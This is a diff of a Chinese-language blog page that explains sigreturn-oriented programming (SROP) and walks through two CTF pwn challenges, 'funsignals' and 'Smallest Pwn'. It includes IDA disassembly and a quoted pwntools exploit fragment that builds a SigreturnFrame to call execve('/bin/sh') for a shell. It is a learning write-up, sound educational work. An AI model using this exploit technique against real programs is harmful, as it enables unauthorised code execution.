@@ -75,8 +75,6 @@
 				    
 				    <li><a href="/categories/Generalization/" class="animsition-link">Generalization<small>(2)</small></a></li>
 				    
-				    <li><a href="/categories/HEAP-Chunk-Overlapping/" class="animsition-link">HEAP - Chunk Overlapping<small>(1)</small></a></li>
-				    
 				    <li><a href="/categories/HEAP-Fastbin-Attack/" class="animsition-link">HEAP - Fastbin Attack<small>(9)</small></a></li>
 				    
 				    <li><a href="/categories/HEAP-Heap-overflow/" class="animsition-link">HEAP - Heap overflow<small>(1)</small></a></li>
@@ -87,9 +85,9 @@
 				    
 				    <li><a href="/categories/HEAP-Tcache/" class="animsition-link">HEAP - Tcache<small>(2)</small></a></li>
 				    
-				    <li><a href="/categories/HEAP-UNLINK/" class="animsition-link">HEAP - UNLINK<small>(1)</small></a></li>
+				    <li><a href="/categories/HEAP-Unlink/" class="animsition-link">HEAP - Unlink<small>(2)</small></a></li>
 				    
-				    <li><a href="/categories/HEAP-Unsortedbin/" class="animsition-link">HEAP-Unsortedbin<small>(1)</small></a></li>
+				    <li><a href="/categories/HEAP-Unsortedbin/" class="animsition-link">HEAP - Unsortedbin<small>(1)</small></a></li>
 				    
 				    <li><a href="/categories/MESS/" class="animsition-link">MESS<small>(20)</small></a></li>
 				    
@@ -227,17 +225,15 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-DzXLMOje" class="aplayer aplayer-tag-marker meting-tag-marker"
-         data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"
-    ></div> 
+    <div id="aplayer-gZNcOqIR" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
 
-<h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1)前言"></a>1)前言</h2><p>​        在看完csapp的异常控制流之后，对于信号以及系统调用有了更加深入的了解，故借此机会探明SROP，这个本身并不复杂的知识点。</p>
-<h2 id="2）SROP原理"><a href="#2）SROP原理" class="headerlink" title="2）SROP原理"></a>2）SROP原理</h2><p>​         当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。</p>
+<h2><span id="1前言">1)前言</span></h2><p>​        在看完csapp的异常控制流之后，对于信号以及系统调用有了更加深入的了解，故借此机会探明SROP，这个本身并不复杂的知识点。</p>
+<h2><span id="2srop原理">2）SROP原理</span></h2><p>​         当用户向内核发起signal时，此时系统切换为内核态，并且由内核保存进程的上下文（通常是一些寄存器状态）至用户栈，然后切换回用户态，执行信号处理程序。程序执行完毕后，再次切换成内核态，将保存的寄存器状态恢复后返回用户态。</p>
 <p>​        所以这一串来回切换中，一个缺陷就是第一次切换时上下文保存于用户栈中，所以正好我们可以通过栈溢出控制栈中的数据，而且当寄存器恢复时，内核并不会检查栈中的内容是否被篡改。</p>
 <p>​        借一张图说明一下：</p>
 <p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/figure/ProcessOfSignalHandlering.png" alt="Process of Signal Handlering"></p>
-<h2 id="3）SROP利用"><a href="#3）SROP利用" class="headerlink" title="3）SROP利用"></a>3）SROP利用</h2><p>​        pwntools中为我们集成了srop利用的工具,接下来我们通过一个极为刻意的例子演示一下如何利用。</p>
-<h3 id="funsignal"><a href="#funsignal" class="headerlink" title="funsignal"></a>funsignal</h3><p>​        题目地址： <a target="_blank" rel="noopener" href="https://github.com/fuurinko/CTF-TASK/blob/main/funsignals_player_bin">funsignals</a> </p>
+<h2><span id="3srop利用">3）SROP利用</span></h2><p>​        pwntools中为我们集成了srop利用的工具,接下来我们通过一个极为刻意的例子演示一下如何利用。</p>
+<h3><span id="funsignal">funsignal</span></h3><p>​        题目地址： <a target="_blank" rel="noopener" href="https://github.com/fuurinko/CTF-TASK/blob/main/funsignals_player_bin">funsignals</a> </p>
 <p>​        打开题目，是手写汇编。</p>
 <p>​        <img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2021-11-09%20%E4%B8%8B%E5%8D%883.36.29.png" alt="截屏2021-11-09 下午3.36.29"></p>
 <p>​        观察一下。程序分别通过系统调用，调用了<code>sys_read </code>, <code>sys_sigreturn</code>两个函数。</p>
@@ -249,11 +245,11 @@
 
 <p>​        这里就类似pwntools的rop模块，只是把需要的东西生成一下然后存起来。当程序调用<code>sys_read</code>的时候把东西读进用户栈，然后接着调用 <code>sys_sigreturn</code>让内核将用户栈的东西恢复，就相当于调用了<code>sys_write</code>，从而读出flag的值。</p>
 <p>​        但是这道题将我们需要的任何地址都给出了，甚至也不需要构造<code>sys_sigreturn</code>，我们通过另外一个例子来演示一下如何构造<code>sys_sigreturn</code>并且获得一个shell。</p>
-<h3 id="Smallest-Pwn"><a href="#Smallest-Pwn" class="headerlink" title="Smallest Pwn"></a>Smallest Pwn</h3><p>​        题目：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#360chunqiu2017_smallest">smallest pwn</a></p>
+<h3><span id="smallest-pwn">Smallest Pwn</span></h3><p>​        题目：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#360chunqiu2017_smallest">smallest pwn</a></p>
 <p>​        直接先在IDA中查看：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">start           proc near               ; DATA XREF: LOAD:0000000000400018↑o</span><br><span class="line">.text:00000000004000B0                 xor     rax, rax</span><br><span class="line">.text:00000000004000B3                 mov     edx, 400h       ; count</span><br><span class="line">.text:00000000004000B8                 mov     rsi, rsp        ; buf</span><br><span class="line">.text:00000000004000BB                 mov     rdi, rax        ; fd</span><br><span class="line">.text:00000000004000BE                 syscall                ; LINUX - sys_read</span><br><span class="line">.text:00000000004000C0                 retn</span><br><span class="line">.text:00000000004000C0 start           endp</span><br><span class="line">.text:00000000004000C0</span><br><span class="line">.text:00000000004000C0 _text           ends</span><br><span class="line">.text:00000000004000C0</span><br><span class="line">.text:00000000004000C0</span><br><span class="line">.text:00000000004000C0                 end start</span><br></pre></td></tr></table></figure>
 
-<h4 id="ctf-wiki题解"><a href="#ctf-wiki题解" class="headerlink" title="ctf-wiki题解"></a>ctf-wiki题解</h4><p>​        可以看到程序本身就是一个<code>sys_read</code>。所以我们需要利用它来getshell，难度可想而知。</p>
+<h4><span id="ctf-wiki题解">ctf-wiki题解</span></h4><p>​        可以看到程序本身就是一个<code>sys_read</code>。所以我们需要利用它来getshell，难度可想而知。</p>
 <p>​        由于题目只给出了<code>sys_read</code>，但是泄露程序内存我们肯定是需要一个<code>sys_write</code>    的，所以这里有一个trick，就是通过将<code>sys_read</code>的返回值构造成函数的系统调用号。然后调用<code>sys_write</code>以及<code>sys_sigreturn</code>。</p>
 <p>​        那么来看详细的分析</p>
 <p>​        首先需要调用<code>sys_write</code>，系统调用号为4，也就是需要<code>sys_read</code>返回读入四个字符，将rax的值赋为4。</p>
@@ -280,7 +276,7 @@
 
 <p>​        我们再次利用<code>SigreturnFrame()</code>来构造我们读入用户栈的内容。内容也比较直观，就是一个·类似shellcode的东西。然后再调用<code>sys_sigreturn</code>来触发。</p>
 <p>​        所以总结下来就是，先通过读入一个字符覆盖start函数地址，调用<code>sys_write</code>泄露栈地址，通过两次调用<code>sys_sigreturn</code>，第一次执行<code>sys_read</code>，将<code>execute(&quot;/bin/sh&quot;)</code>写入用户栈，第二次调用<code>sys_sigreturn</code>来getshell。</p>
-<h4 id="自己的反思"><a href="#自己的反思" class="headerlink" title="自己的反思"></a>自己的反思</h4><p>​        有一个疑惑，就是既然我们能够通过控制rax而控制<code>syscall</code>，而普通的<code>sys_read</code>也是将用户输入储存到栈上，那为什么还要多此一举，去获得rsp的地址，再将shellcode写到那上面呢？</p>
+<h4><span id="自己的反思">自己的反思</span></h4><p>​        有一个疑惑，就是既然我们能够通过控制rax而控制<code>syscall</code>，而普通的<code>sys_read</code>也是将用户输入储存到栈上，那为什么还要多此一举，去获得rsp的地址，再将shellcode写到那上面呢？</p>
 <p>​        怀着这样的问题，果然我在网上找到了一个和我想法完全一致的人。他的exp的关键部分是这样的：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">reread = <span class="number">0x4000b0</span></span><br><span class="line">syscall = <span class="number">0x4000be</span></span><br><span class="line"></span><br><span class="line">rereadaddr = p64(reread)</span><br><span class="line">syscalladdr = p64(syscall)</span><br><span class="line"></span><br><span class="line">context.clear()</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rdi = <span class="number">0x7fffffffe4e8</span></span><br><span class="line">frame.rip = syscall</span><br><span class="line"></span><br><span class="line">binsh=<span class="string">&#x27;/bin/sh&#x27;</span> </span><br><span class="line"></span><br><span class="line">playload1 = rereadaddr+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+ <span class="built_in">str</span>(frame)+binsh</span><br><span class="line">p.send(playload1)</span><br><span class="line"></span><br><span class="line">playload2 = syscalladdr+<span class="string">&#x27;a&#x27;</span>*<span class="number">7</span></span><br><span class="line"></span><br><span class="line">p.send(playload2)</span><br><span class="line"><span class="comment">#http://www.reshahar.com/2017/05/04/360春秋杯smallest-pwn的学习与利用/</span></span><br></pre></td></tr></table></figure>
 
@@ -290,8 +286,8 @@
 <p>​        <code>SigreturnFrame()</code>中有一个非常重要的part：<code>sigframe.rsp</code></p>
 <p>​        我们自己构造的寄存器状态肯定是需要rsp的值的，并且这里rsp肯定也是要可写的，不然后面我们无法把getshell的函数写进去，所以我们这里肯定要指定一个可写的栈上的地址。</p>
 <p>​        所以之前那种想法就不攻自破了，在那种情况下我们无法获取任何栈上的地址，自然也没有东西可以填，所以还是需要通过<code>sys_write</code>    ,来回跳转执行流。</p>
-<h2 id="4）总结"><a href="#4）总结" class="headerlink" title="4）总结"></a>4）总结</h2><p>​        非常有意思的一个知识点，但是非常奇怪的是我花在理解上的时间比之前任何知识点都短，可能是我之前嗯啃csapp，对于信号，系统调用等稍有了解。也可能是我研究例题的时候完全是参考涅普的视频教程，有pwn奶奶的细节讲解。（这个可能比较重要），说到底还是知识点本身比较简单。</p>
-<h2 id="5）参考"><a href="#5）参考" class="headerlink" title="5）参考"></a>5）参考</h2><p>​        </p>
+<h2><span id="4总结">4）总结</span></h2><p>​        非常有意思的一个知识点，但是非常奇怪的是我花在理解上的时间比之前任何知识点都短，可能是我之前嗯啃csapp，对于信号，系统调用等稍有了解。也可能是我研究例题的时候完全是参考涅普的视频教程，有pwn奶奶的细节讲解。（这个可能比较重要），说到底还是知识点本身比较简单。</p>
+<h2><span id="5参考">5）参考</span></h2><p>​        </p>
 <p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29343201/article/details/72627439">2017 429 ichunqiu ctf smallest(pwn300) writeup</a>        </p>
 <p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_5">SROP</a></p>
 
